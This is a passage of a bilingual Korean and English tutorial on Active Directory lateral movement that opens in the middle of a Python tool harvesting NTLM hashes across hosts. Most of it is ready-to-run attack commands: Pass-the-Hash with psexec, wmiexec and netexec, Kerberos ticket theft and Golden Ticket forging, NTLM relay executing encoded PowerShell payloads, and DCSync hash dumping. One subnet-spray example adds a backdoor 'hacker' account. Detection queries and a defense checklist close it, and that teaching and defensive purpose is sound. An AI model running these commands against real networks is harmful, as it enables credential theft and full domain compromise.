            for t in targets
        }
        for future in as_completed(futures):
            dump = future.result()
            if dump.error:
                print(f"[-] {dump.target}: {dump.error}")
            elif dump.ntlm_hashes:
                print(f"[+] {dump.target}: {len(dump.ntlm_hashes)}개 해시 수집")
                all_hashes.extend(dump.ntlm_hashes)
            else:
                print(f"[?] {dump.target}: 해시 없음")

    unique_hashes = sorted(set(all_hashes))
    if unique_hashes:
        args.output.write_text("\n".join(unique_hashes))
        print(f"\n[+] 고유 해시 {len(unique_hashes)}개 → {args.output}")
    else:
        print("\n[*] 수집된 해시 없음")


if __name__ == "__main__":
    main()
```

---

## 9. 탐지 우선순위 — 블루팀 관점

### 핵심 Windows 이벤트 ID

| 이벤트 ID | 의미 | 횡이동 관련성 | 우선도 |
|-----------|------|----------------|--------|
| 4624 | 로그온 성공 | Type 3 (네트워크) / Type 10 (원격) | 높음 |
| 4648 | 명시적 자격증명 로그온 | PtH · PtT | 높음 |
| 4672 | 특권 로그온 | 관리자 권한 사용 | 높음 |
| 4688 | 프로세스 생성 | psexec · wmiexec | 중간 |
| 5145 | 네트워크 공유 접근 | ADMIN$·C$ 접근 | 높음 |
| 4662 | AD 객체 작업 | DCSync (DS-Replication) | 매우 높음 |
| 7045 | 서비스 설치 | psexec 서비스 생성 | 높음 |
| 4104 | PowerShell 스크립트 블록 로그 | WinRM 원격 실행 | 중간 |
| 4776 | NTLM 인증 시도 | PtH 탐지 | 중간 |

### 탐지 쿼리 예시 (Splunk/SIEM)

```
[Splunk 쿼리 예시]

# PsExec 탐지 (Event 7045 + ADMIN$ 접근)
index=windows EventCode=7045
| where ServiceFileName like "%PSEXESVC%"

# DCSync 탐지 (DC가 아닌 IP에서 복제 요청)
index=windows EventCode=4662
| where ObjectType="domainDNS"
  AND AccessMask="0x100" (DS-Replication-Get-Changes-All)
  AND IpAddress!="DC_IP"

# Pass-the-Hash 탐지 (네트워크 로그온 + LM 해시 없음)
index=windows EventCode=4624
| where LogonType=3
  AND AuthenticationPackage="NTLM"
  AND LmPackageName!="NTLM V2"

# 비정상 관리자 로그온 패턴
index=windows EventCode=4624 LogonType=3
| stats count by src_ip, dest_ip, Account_Name
| where count > 5
| sort -count
```

### 방어 체크리스트

```
[AD 횡이동 방어 체크리스트]

□ SMB 서명 활성화 (NTLM 릴레이 방지)
  그룹 정책: Computer Configuration → Windows Settings →
  Security Settings → Local Policies → Security Options →
  "Microsoft network server: Digitally sign communications (always)"

□ NTLM 인증 제한 (Kerberos 강제)
  Network security: LAN Manager authentication level → NTLMv2만 허용

□ Credential Guard 활성화 (LSASS 보호)
  Windows Defender Credential Guard

□ Local Administrator Password Solution (LAPS) 도입
  각 PC마다 다른 로컬 관리자 비밀번호 → PtH 횡이동 차단

□ Protected Users 그룹 사용 (민감한 계정)
  Kerberos 전용 인증 강제

□ Restricted Admin Mode (RDP PtH 방지)
□ WinRM 접근 제어 (허가된 관리자 IP만)
□ PowerShell Constrained Language Mode
□ Privileged Access Workstation (PAW) 구성
□ Tiered Administration 모델 도입
```

---

<a name="english"></a>

# AD Lateral Movement — NTLM Relay, DCSync, PsExec, and Remote Execution

## Learning Objectives

By the end of this document, you will be able to:

- Explain what lateral movement is and why it is particularly dangerous in AD environments
- Describe Pass-the-Hash and Pass-the-Ticket in plain language
- Understand remote execution via PsExec, WMI, WinRM, and DCOM
- Follow the step-by-step flow of an NTLM relay attack
- Know the conditions for DCSync and how to perform and detect it
- Apply key Windows Event IDs to detect lateral movement from a blue team perspective
- Automate multi-host remote execution and credential dumping with Python CLI tools

---

## What Is Lateral Movement?

### Plain-Language Explanation

Lateral movement is the technique of **"using an already-compromised system as a foothold to access other systems on the same network."**

**Real-world analogy: moving through a company building**

```
Company building (Active Directory domain):

  Ground floor: Employee workstations (low privilege)
  Second floor: Department servers (medium privilege)
  Third floor: Admin offices (high privilege)
  Basement:     Vault = Domain Controller (maximum privilege)

Attacker scenario:
  ① Compromise a ground-floor workstation (initial access)
  ② Copy the employee's ID card (steal credentials)
  ③ Use the copied card to enter the server room (lateral movement)
  ④ Obtain server admin credentials
  ⑤ Use admin credentials to reach the vault (privilege escalation)
  ⑥ Domain Controller fully compromised
```

Why lateral movement is especially dangerous:
- Uses legitimate administrative tools (WMI, WinRM) — hard to distinguish from normal admin activity
- Spreads rapidly in AD environments where credentials are shared
- Once started, difficult to stop — the entire domain becomes at risk

### Position in the Attack Kill Chain

```
[Cyber Kill Chain — where lateral movement fits]

Recon → Weaponize → Deliver → Exploit → Install → [C2] → [Lateral Move] → Objective
                                                               ↑
                                                      focus of this document
```

---

## Active Directory Fundamentals

### What Is Active Directory?

Active Directory (AD) is Microsoft's **"centralized system for managing all users and computers in an organization."**

```
[AD Structure — Organizational Analogy]

Domain (corp.local) = The entire company
├── Domain Controller (DC) = HR + Security (manages all privileges)
├── OU (Organizational Unit) = Department
│   ├── IT Department
│   │   ├── Server 1 (computer account)
│   │   └── Server 2
│   └── Sales Department
│       ├── PC-001
│       └── PC-002
└── User accounts
    ├── administrator (domain admin)
    ├── jsmith (regular user)
    └── svc_backup (service account)
```

### Why Is AD a High-Value Target?

- **Centralized credentials**: one account can access hundreds of machines
- **Implicit trust**: machines on the same domain trust each other
- **Legacy protocols**: NTLM and Kerberos have design-level weaknesses
- **Blast radius**: compromising the DC = compromising the entire organization

---

## 1. Lateral Movement Technique Overview

| Technique | Tool | Required Privilege | Detection Difficulty |
|-----------|------|--------------------|---------------------|
| PsExec | psexec.py / Sysinternals | Local administrator | Easy (Event 7045) |
| WMI | wmiexec.py | Local administrator | Medium |
| WinRM | evil-winrm | WinRM access | Medium |
| DCOM | dcomexec.py | Local administrator | Hard |
| Pass-the-Hash | pth-winexe | Local admin NTLM hash | Medium |
| Pass-the-Ticket | Rubeus / ticketer.py | Valid Kerberos ticket | Hard |
| NTLM Relay | ntlmrelayx.py | Network position | Medium |
| DCSync | secretsdump.py | DS-Replication permission | Medium–Hard |

---

## 2. Pass-the-Hash (PtH) — Concept and Attack

### What Is Pass-the-Hash?

**Plain explanation**: You can log in with a user's password "fingerprint" (hash) without knowing the actual password.

**Analogy: key duplication**

```
Normal authentication:
  You → "My password is P@ssw0rd123" → Server validates → Access granted

NTLM authentication (design flaw):
  You → Send only NTLM hash → Server validates → Access granted

  password = abc123
  hash     = aad3b435b51404ee:e10adc3949ba59ab... (fixed value)

  With the hash alone → send it to the server → authentication passes!
  No plaintext password required.
```

**Where do NTLM hashes come from?**:
- LSASS memory dump (Mimikatz)
- SAM database
- NTDS.dit (Domain Controller database)
- Memory scanning

### ASCII Attack Flow Diagram

```
[Pass-the-Hash Attack Flow]

Step 1: Collect the hash
  Victim PC (192.168.1.50)
  └─ Run Mimikatz
     └─ LSASS memory → extract NTLM hash
        admin_hash = aad3b435b51404ee:e10adc3949ba59ab...

Step 2: Authenticate to other systems using only the hash
  Attacker tool ──[NTLM hash]──► Target server (192.168.1.10)
                                 NTLM auth passes!
                                 → Remote command execution

Step 3: Spread laterally
  192.168.1.10 ──► 192.168.1.20 ──► DC (192.168.1.1)
  (same hash works on many systems — admin hash reuse)
```

### Commands

```bash
# psexec — creates a service on target (loud, Event 7045)
python3 psexec.py -hashes :NTLM_HASH domain/administrator@10.10.10.100

# wmiexec — WMI-based, no service creation (quieter)
python3 wmiexec.py -hashes :NTLM_HASH domain/admin@10.10.10.100
python3 wmiexec.py -hashes :e10adc3949ba59abbe56e057f20f883e \
    corp.local/admin@192.168.1.10 "whoami"

# smbexec — SMB-based, harder to detect
python3 smbexec.py -hashes :NTLM_HASH domain/admin@10.10.10.100

# evil-winrm — WinRM / PowerShell Remoting (port 5985)
evil-winrm -i 10.10.10.100 -u administrator -H NTLM_HASH

# xfreerdp — RDP via hash (requires Restricted Admin mode on target)
xfreerdp /v:10.10.10.100 /u:administrator /pth:NTLM_HASH /d:domain

# netexec — bulk PtH across an entire subnet
netexec smb 10.10.10.0/24 -u administrator -H NTLM_HASH --local-auth
netexec smb 192.168.1.0/24 -u admin -H :NTLM_HASH -x "whoami"
```

---

## 3. Pass-the-Ticket (PtT) — Kerberos Ticket Reuse

### What Is Pass-the-Ticket?

**Plain explanation**: Stealing Kerberos authentication "tickets" and impersonating the legitimate user.

**Analogy: copying a concert ticket**

```
Normal Kerberos authentication:
  User → Request to DC → Receive TGT (master ticket) → Access service

Pass-the-Ticket:
  Attacker → Steal user's TGT → Use stolen ticket to access services!

  TGT (Ticket Granting Ticket) = Master concert ticket
  TGS (Ticket Granting Service) = Section-specific ticket

  With the TGT, you can request tickets for any service (section)!
```

### Commands

```bash
# Rubeus (Windows) — dump and inject tickets
Rubeus.exe dump /nowrap
Rubeus.exe dump /user:administrator /nowrap
Rubeus.exe ptt /ticket:BASE64_ENCODED_TICKET
klist

# Mimikatz — extract tickets from memory
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt ticket.kirbi

# Impacket (Linux) — request and use tickets
python3 getTGT.py -hashes :NTLM_HASH domain.local/username
export KRB5CCNAME=username.ccache
python3 psexec.py -k -no-pass domain.local/username@target.domain.local
python3 secretsdump.py -k -no-pass domain.local/username@dc.domain.local

# Golden Ticket — permanent access with krbtgt hash
python3 ticketer.py -nthash KRBTGT_HASH \
    -domain-sid S-1-5-21-XXXXXXXX \
    -domain domain.local \
    administrator
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass domain.local/administrator@dc.domain.local
```

---

## 4. WMI / WinRM / SMB Lateral Movement

### Comparison of Methods

```
[Lateral Movement Method Comparison]

┌──────────┬──────────┬───────────────────┬──────────────────┐
│ Method   │ Port     │ Characteristics   │ Detection        │
├──────────┼──────────┼───────────────────┼──────────────────┤
│ PsExec   │ 445 SMB  │ Creates a service │ Easy (Evt 7045)  │
│ WMI      │ 135+dyn  │ No service        │ Medium           │
│ WinRM    │ 5985/86  │ PowerShell remote │ Medium           │
│ DCOM     │ 135+dyn  │ COM object abuse  │ Hard             │
│ SMBexec  │ 445      │ File + execute    │ Medium           │
└──────────┴──────────┴───────────────────┴──────────────────┘
```

### PsExec — How It Works

```
[PsExec Internal Flow]

① Attacker uploads executable to ADMIN$ share
② Registers a service with the Service Control Manager (SCM)
③ Service starts → command executes
④ Result returned → service removed + file deleted

Detection points:
  Event 7045: New service installed
  Event 5145: ADMIN$ share access
  Event 4624: Network logon (Type 3)
```

```bash
# PsExec with password
python3 psexec.py corp.local/administrator:Password@192.168.1.10

# PsExec with NTLM hash
python3 psexec.py -hashes :NTLM_HASH corp.local/administrator@192.168.1.10

# Run specific command
python3 psexec.py corp.local/admin:Pass@192.168.1.10 "cmd.exe /c whoami"
```

### WMI — How It Works

```
[WMI Internal Flow]

① Attacker connects to WMI service via DCOM/RPC (port 135)
② Calls Win32_Process.Create() method
③ Target system creates process → command executes
④ Attacker retrieves output via WMI query

Advantage: No service creation → no Event 7045
Detection: Event 4688 (process creation), WMI activity logs
```

```bash
python3 wmiexec.py corp.local/admin:Password@192.168.1.10
python3 wmiexec.py -hashes :NTLM_HASH corp.local/admin@192.168.1.10
python3 wmiexec.py corp.local/admin:Pass@192.168.1.10 "ipconfig /all"
```

### WinRM — PowerShell Remoting

```
[WinRM Flow]

① WinRM service listens on 5985 (HTTP) or 5986 (HTTPS)
② Authentication: Kerberos / NTLM / certificate
③ PowerShell remote session established
④ Commands execute under user privilege (not SYSTEM)

Characteristics: the most "legitimate-looking" technique
Detection: Event 4624 Type 3, PowerShell logging (4104)
```

```bash
# evil-winrm (attack tool)
evil-winrm -i 192.168.1.10 -u administrator -p Password
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH

# File upload/download from within evil-winrm shell:
# upload /local/path/file.exe C:\Windows\Temp\file.exe
# download C:\Windows\System32\config\SAM /tmp/SAM
```

---

## 5. NTLM Relay Attack — Step-by-Step

### What Is NTLM Relay?

**Plain explanation**: Intercept an NTLM authentication attempt and "relay" it to a different server.

**Analogy: identity card relay**

```
Normal authentication:
  Employee → "I am Kim Chul-su (NTLM auth)" → Server A → Access granted

NTLM relay:
  Employee → "I am Kim Chul-su" → [attacker intercepts]
                                       ↓ relays!
                                  Server B → "Kim Chul-su logged in!"

Attacker impersonates Kim Chul-su on Server B!
```

### Prerequisites

```
Conditions for a successful NTLM relay:
  ① Target server has SMB signing disabled
     (signing present → relayed auth can be verified → attack fails)
  ② Attacker is in a position to intercept network traffic
     (ARP spoofing or LLMNR poisoning)
  ③ A victim is tricked into sending NTLM auth to the attacker
```

### ASCII Attack Flow

```
[Full NTLM Relay Flow]

Step 1: Identify targets without SMB signing
  netexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

Step 2: Position tools
  On attacker system:
  ┌─────────────┐     ┌───────────────────────────┐
  │  Responder  │     │      ntlmrelayx.py        │
  │(LLMNR poison)│     │(intercept + relay + exec) │
  │ SMB/HTTP off │     │ -tf relay_targets.txt     │
  └─────────────┘     └───────────────────────────┘

Step 3: Capture and relay

  Victim PC ──[NTLM Auth]──► Responder
  (malformed name query)     (poison response → triggers auth)
                                 │
                                 ▼  relays!
                            Target server (no SMB signing)
                            ← authentication success →
                            code execution!

Step 4: Result
  Command executes on target server
  OR LDAP privilege escalation
  OR Shadow Credentials added
```

### Commands — Step by Step

```bash
# Step 1: Find targets without SMB signing
netexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
netexec smb 10.10.10.0/24 | grep -v "signing:True"

# Step 2: Edit Responder config (turn off SMB/HTTP listeners)
sed -i 's/^SMB = On/SMB = Off/' /etc/responder/Responder.conf
sed -i 's/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf

# Step 3: Run ntlmrelayx — code execution
python3 ntlmrelayx.py -tf relay_targets.txt -smb2support \
  -c "powershell -enc BASE64_PAYLOAD" -l /tmp/loot

# Relay to LDAP → privilege escalation (grant DCSync rights to attacker account)
python3 ntlmrelayx.py -t ldap://DC_IP -smb2support \
  --escalate-user current_user

# Relay to LDAPS → Shadow Credentials (add certificate-based auth to target)
python3 ntlmrelayx.py -t ldaps://DC_IP --shadow-credentials \
  --shadow-target target_computer$

# Step 4: Run Responder to trigger NTLM authentication
python3 Responder.py -I eth0 -wf

# IPv6 relay variant (mitm6) — more powerful
python3 mitm6.py -d domain.local
python3 ntlmrelayx.py -6 -t ldaps://DC_IP -wh attacker_wpad \
  --add-computer evilpc --delegate-access
```

---

## 6. DCSync Attack

### What Is DCSync?

DCSync abuses the `DS-Replication-Get-Changes-All` permission (normally held only by Domain Controllers) to pull password hashes from Active Directory without touching the DC locally. It simulates a legitimate DC replication request.

**Analogy: impersonating an HR employee**

```
Normal DC replication:
  DC1 → DC2: "I need to sync the password database" → DC2 sends hashes → DC1

DCSync attack:
  Attacker → DC: "I'm also a DC. Give me the password database"
  → DC sends hashes → Attacker!

Requirement: DS-Replication-Get-Changes-All permission
(normally: Domain Admins, Enterprise Admins, or Domain Controllers groups)
```

### How to Obtain DCSync Rights

```
Paths to DCSync permission:

  Path 1: Compromise a Domain Admin account
  Path 2: Exchange server vulnerability (Exchange holds high AD privileges)
  Path 3: Abuse WriteDACL → directly grant DCSync rights
  Path 4: AdminSDHolder abuse
  Path 5: NTLM relay → LDAP → grant DCSync rights
```

### Commands

```bash
# Impacket secretsdump — DCSync
python3 secretsdump.py -just-dc domain.local/admin:Password@DC_IP

# Dump only specific accounts
python3 secretsdump.py -just-dc-user krbtgt domain.local/admin:Password@DC_IP
python3 secretsdump.py -just-dc-user administrator domain.local/admin:Password@DC_IP

# Dump all domain secrets to file
python3 secretsdump.py domain.local/admin:Password@DC_IP \
  -just-dc -outputfile dcsync_output
# Output: dcsync_output.ntds (hashes)

# DCSync via hash (PtH)
python3 secretsdump.py -hashes :NTLM_HASH domain.local/admin@DC_IP -just-dc

# Mimikatz DCSync (on Windows)
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Grant DCSync rights via ACL (requires WriteDACL on domain object)
# PowerView:
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" \
  -PrincipalIdentity attacker_user \
  -Rights DCSync

# Detection: Event ID 4662 with DS-Replication-Get-Changes-All
# from a non-DC IP address → high confidence DCSync indicator
```

---

## 7. Remote Execution Automation CLI

The spray tool executes a command across multiple targets in parallel using wmiexec or psexec, supporting both password and NTLM hash authentication. Input can be a single IP, CIDR range, or a file containing IP addresses.

```bash
# WMI-based spray across a subnet (password)
python3 lateral_movement.py spray 10.10.10.0/24 corp.local \
    -u administrator -p Password123 -c "whoami" --workers 20

# Hash-based spray
python3 lateral_movement.py spray targets.txt corp.local \
    -u administrator -H NTLM_HASH \
    -c "net user hacker P@ssw0rd /add" -o results.json

# PsExec method (louder but more reliable for SYSTEM-level execution)
python3 lateral_movement.py spray 192.168.1.10 corp.local \
    -u admin -p Password -c "whoami" --method psexec
```

---

## 8. Credential Dump Automation

The credential dump automation uses Impacket's `secretsdump` to extract NTLM hashes from multiple targets in parallel, deduplicates the results, and saves them to a file for use in further Pass-the-Hash attacks.

```bash
# Dump from a single DC
python3 cred_dump.py 192.168.1.10 corp.local -u admin -p Password

# Dump from multiple targets using NTLM hash
python3 cred_dump.py targets.txt corp.local -u admin -H NTLM_HASH -o all_hashes.txt
```

---

## 9. Detection Priority — Blue Team

### Key Windows Event IDs

| Event ID | Meaning | Lateral Movement Relevance | Priority |
|----------|---------|---------------------------|---------|
| 4624 | Logon success | Type 3 (network) / Type 10 (remote interactive) | High |
| 4648 | Explicit credential logon | PtH / PtT | High |
| 4672 | Special privilege logon | Administrator privilege use | High |
| 4688 | Process creation | psexec / wmiexec spawning | Medium |
| 5145 | Network share access | ADMIN$, C$ access | High |
| 4662 | AD object operation | DCSync (DS-Replication) | Critical |
| 7045 | Service installation | psexec service creation | High |
| 4104 | PowerShell script block | WinRM remote execution | Medium |
| 4776 | NTLM auth attempt | PtH detection | Medium |

### SIEM Detection Queries

```
[Splunk Query Examples]

# Detect PsExec (Event 7045 + PSEXESVC service name)
index=windows EventCode=7045
| where ServiceFileName like "%PSEXESVC%"

# Detect DCSync (non-DC IP requesting replication)
index=windows EventCode=4662
| where ObjectType="domainDNS"
  AND AccessMask="0x100"
  AND IpAddress!="DC_IP"

# Detect Pass-the-Hash (network logon with NTLMv1)
index=windows EventCode=4624
| where LogonType=3
  AND AuthenticationPackage="NTLM"
  AND LmPackageName!="NTLM V2"

# Detect abnormal admin logon pattern (many hosts in short time)
index=windows EventCode=4624 LogonType=3
| stats count by src_ip, Account_Name
| where count > 5
| sort -count
```

### Defense Checklist

```
[AD Lateral Movement Defense Checklist]

□ Enable SMB signing (prevents NTLM relay)
  Group Policy: Computer Configuration → Windows Settings →
  Security Settings → Local Policies → Security Options →
  "Microsoft network server: Digitally sign communications (always)"

□ Restrict NTLM (enforce Kerberos)
  Network security: LAN Manager authentication level → NTLMv2 only

□ Enable Credential Guard (protects LSASS)
  Windows Defender Credential Guard

□ Deploy LAPS (Local Administrator Password Solution)
  Unique local admin password per machine → breaks PtH lateral spread

□ Use Protected Users group for sensitive accounts
  Forces Kerberos-only authentication

□ Enable Restricted Admin Mode for RDP (prevents RDP PtH)
□ Restrict WinRM access by IP (authorized admin hosts only)
□ Enable PowerShell Constrained Language Mode
□ Deploy Privileged Access Workstations (PAW)
□ Implement Tiered Administration model
```
